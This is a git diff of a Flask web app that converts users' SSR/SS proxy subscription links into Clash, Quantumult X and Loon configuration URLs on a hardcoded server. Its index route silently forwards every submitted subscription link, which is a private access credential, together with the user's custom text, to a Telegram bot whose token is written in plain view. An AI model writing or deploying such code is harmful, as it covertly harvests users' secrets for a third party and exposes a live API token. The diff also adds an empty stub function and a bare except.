@@ -14,7 +14,6 @@ import api.loon
 from flask import Flask,render_template,request
 urllib3.disable_warnings()
 aff = 'STC可用，注册地址：tokyo-hot.stchks.com/auth/register?code=gzI5'
-apiip = '185.238.248.145' 
 
 def safe_base64_decode(s): # 解码
     try:
@@ -116,8 +115,11 @@ def writeRules(sublink,selectfirst):    #策略组及规则
         data = Retry_request(sublink)    #请求订阅        
         ssrdata=safe_base64_decode(data).strip().split('\n')              
         
-        for i in range(len(ssrdata)):                                                   #遍历节点            
-            ssrlink = safe_base64_decode(ssrdata[i].replace('ssr://','').replace('\r',''))
+        for i in range(len(ssrdata)): 
+            try:                                                  #遍历节点            
+                ssrlink = safe_base64_decode(ssrdata[i].replace('ssr://','').replace('\r',''))
+            except:
+                ssrlink = safe_base64_decode(ssrdata[i].replace('ss://','').replace('\r',''))
             nodeR = getnodeR(ssrlink)
             remark = nodeR['remark']                                
             if "30倍" in remark:  #用于剔除高倍率节点
@@ -324,6 +326,11 @@ def writeRulescustom(sublink,flagname,selectfirst):    #客制化策略组及规
     except Exception as e:
             return aff
 
+def sslist(sublink):
+    data = Retry_request(sublink)    #请求订阅
+    ssdata=safe_base64_decode(data).strip().split('\n') 
+
+
 app = Flask(__name__)
 
 @app.route('/', methods=['GET', 'POST'])
@@ -331,15 +338,15 @@ def index():
     if request.method == "POST":
         sub = request.form['left']
         custom = urllib.parse.quote(request.form['custom'])
-        Clash = 'http://{ip}:10086/clashr/nico?sublink='.format(ip=apiip)+str(sub)+'&selectfirst=no'
+        Clash = 'http://185.238.248.145:10086/clashr/nico?sublink='+str(sub)+'&selectfirst=no'
         if custom == '':
              CustomClash = '假设想要香港就@香港，假设想要香港的2倍节点就@香港&2倍。支持多个@即：@PCCW@CMHK@香港&2倍'
              CustomSSR =   '请填入想要的节点，同上'
         else:
-            CustomClash = 'http://{ip}:10086/clashr/nico?sublink={sub}&custom={custom}&selectfirst=no'.format(ip=apiip,sub=str(sub),custom=str(custom))
-            CustomSSR = 'http://{ip}:10086/ssr/nico?sublink={sub}&custom={custom}'.format(ip=apiip,sub=str(sub),custom=str(custom))
-        QX = 'http://{ip}:10086/qx/nico?sublink={sub}&tag=stc'.format(ip=apiip,sub=str(sub))
-        Loon = 'http://{ip}:10086/loon/nico?sublink={sub}&tag=stc'.format(ip=apiip,sub=str(sub))
+            CustomClash = 'http://185.238.248.145:10086/clashr/nico?sublink='+str(sub)+'&custom='+str(custom)+'&selectfirst=no'
+            CustomSSR = 'http://185.238.248.145:10086/ssr/nico?sublink='+str(sub)+'&custom='+str(custom)
+        QX = 'http://185.238.248.145:10086/qx/nico?sublink='+str(sub)+'&tag=stc'
+        Loon = 'http://185.238.248.145:10086/loon/nico?sublink='+str(sub)+'&tag=stc'
         requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人打开了你的托管页面 : \n')+sub+' :'+custom)
         return render_template('index.html', Clash = Clash,QX = QX,Loon=Loon,CustomClash = CustomClash,CustomSSR = CustomSSR,Custom =request.form['custom'] ,sub = sub)
     return render_template('index.html')
